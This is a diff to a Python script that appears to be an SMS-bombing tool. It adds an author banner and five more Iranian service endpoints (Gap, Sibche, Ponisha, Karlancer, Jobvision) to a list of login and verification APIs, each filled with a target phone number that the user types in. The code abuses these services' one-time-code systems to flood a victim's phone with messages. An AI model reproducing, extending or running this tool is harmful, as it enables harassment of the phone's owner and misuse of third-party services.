@@ -11,11 +11,51 @@ Grey="\033[1;30m"
 Reset="\033[0m"
 cyan = "\033[36m"
 purple = "\033[35m"
+reset = "\033[0m"
 #########################
 
+
+name = "Danyal"
+github = "https://github.com/Danyalss"
+pirate = '''       !
+       !
+       ^
+      / \\
+     /___\\
+    |=   =|
+    |     |
+    |     |
+    |     |
+    |     |
+    |     |
+    |     |
+    |     |
+    |     |
+    |     |
+    |     |
+   /|##!##|\\
+  / |##!##| \\
+ /  |##!##|  \\
+|  / ^ | ^ \\  |
+| /  ( | )  \\ |
+|/   ( | )   \\|
+    ((   ))
+   ((  :  ))
+   ((  :  ))
+    ((   ))
+     (( ))
+      ( )
+       .
+       .
+       .'''
+
+# چاپ کد پیریت با رنگ زرد
+print(f"{Green}Name: {name}")
+print(f"{Green}Github: {github}{reset}")
+print(f"{Green}{pirate}{reset}")
+
+
 number = input("" + cyan + "[" + Red + "Enter" + cyan + "]─[" + Blue + "the number" + cyan + "]─[" + Green + "(937.........) :" + cyan + "]" + Red + ": " + Reset)
-
-
 
 
 url_divar = "https://api.divar.ir/v5/auth/authenticate"
@@ -125,14 +165,26 @@ json_cafebazaar = {
 	}
 }
 
+url_gap = f"https://core.gap.im/v1/user/add.json?mobile=%2B98{number}"
+
+url_sibche = "https://api.sibche.com/profile/sendCode"
+json_sibche = {"mobile": "0" + number}
 
 
+url_ponisha = "https://ponisha.ir/send-mobile-verfication"
+json_ponisha = {
+	"mobile": "+98" + number,
+	"type": "1"
+}
 
 
+url_karlancer = "https://www.karlancer.com/api/register"
+json_karlancer = {
+	"phone": "0" + number,
+	"role": "employer"
+}
 
-
-
-
+url_jobvision = f"https://account.jobvision.ir/Candidate/SendVerificationForRegister?mobile=0{number}"
 
 
 
